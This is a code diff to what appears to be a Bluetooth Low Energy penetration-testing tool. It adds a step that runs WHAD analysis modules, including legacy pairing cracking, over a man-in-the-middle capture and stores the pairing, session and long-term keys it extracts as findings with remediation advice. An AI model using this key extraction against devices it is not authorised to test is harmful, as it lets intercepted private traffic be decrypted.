@@ -15,6 +15,7 @@ Mirrors Stage 5's dongle lifecycle: close WhadDevice before CLI, reopen after.
 
 from __future__ import annotations
 
+import json
 import re
 import shutil
 import subprocess
@@ -122,6 +123,9 @@ def run(dongle: WhadDongle, target: Target, engagement_id: str) -> None:
         connections_accepted=connections_accepted,
     )
     _print_summary(target, data_intercepted, connections_accepted, str(_pcap))
+
+    if _pcap.exists() and _pcap.stat().st_size > 0:
+        _analyze_pcap_keys(str(_pcap), target, engagement_id)
 
 
 def _ask_link_layer() -> bool:
@@ -377,6 +381,76 @@ def _record_finding(
         f"connections_accepted={connections_accepted}  "
         f"data_intercepted={data_intercepted}"
     )
+
+
+_KEY_MODULES: list[tuple[str, str, str, tuple[str, ...]]] = [
+    ("legacy_pairing_cracking", "mitm_pairing_key", "critical", ("stk", "ltk", "rand", "ediv")),
+    ("encrypted_session_initialization", "mitm_session_key", "high",
+     ("skd_master", "skd_slave", "iv_master", "iv_slave")),
+    ("ltk_distribution", "mitm_ltk", "critical", ("ltk", "rand", "ediv")),
+]
+
+
+def _analyze_pcap_keys(
+    pcap: str,
+    target: Target,
+    engagement_id: str,
+) -> None:
+    """Run wanalyze key-extraction modules against the proxy PCAP.
+
+    Any BLE session keys or pairing keys captured during the MITM session are
+    extracted and stored as additional Findings. These can be used to decrypt
+    the traffic offline with wireshark -o uat:ble_key:... or wsniff -d -k.
+    """
+    if not shutil.which("wplay") or not shutil.which("wanalyze"):
+        return
+
+    for module, finding_type, severity, key_fields in _KEY_MODULES:
+        cmd = f"wplay --flush {pcap} ble | wanalyze --json {module}"
+        try:
+            result = subprocess.run(
+                cmd, shell=True, capture_output=True, text=True, timeout=60
+            )
+            raw = result.stdout.strip()
+            if not raw:
+                continue
+            data = json.loads(raw)
+            if not isinstance(data, dict):
+                continue
+            keys = {k: str(v) for k, v in data.items() if k in key_fields and v}
+            if not keys:
+                continue
+        except (json.JSONDecodeError, subprocess.TimeoutExpired, Exception) as exc:
+            log.debug(f"[S6] wanalyze {module}: {exc}")
+            continue
+
+        log.info(f"[S6] Key material extracted via {module}: {list(keys.keys())}")
+        finding = Finding(
+            type=finding_type,
+            severity=severity,
+            target_addr=target.bd_address,
+            description=(
+                f"Key material extracted from MITM proxy PCAP via {module}. "
+                f"Keys: {list(keys.keys())}. "
+                "Captured traffic can be fully decrypted offline."
+            ),
+            remediation=(
+                "Use LE Secure Connections (LESC) pairing — legacy key material "
+                "is derivable from captured traffic. Rotate any credentials or "
+                "sensitive data exchanged during the intercepted session."
+            ),
+            evidence={
+                "module": module,
+                "keys": keys,
+                "pcap": pcap,
+                "target": target.bd_address,
+            },
+            pcap_path=pcap,
+            engagement_id=engagement_id,
+        )
+        insert_finding(finding)
+        log.info(f"FINDING [{severity}] {finding_type}: {target.bd_address}")
+
 
 
 def _print_summary(
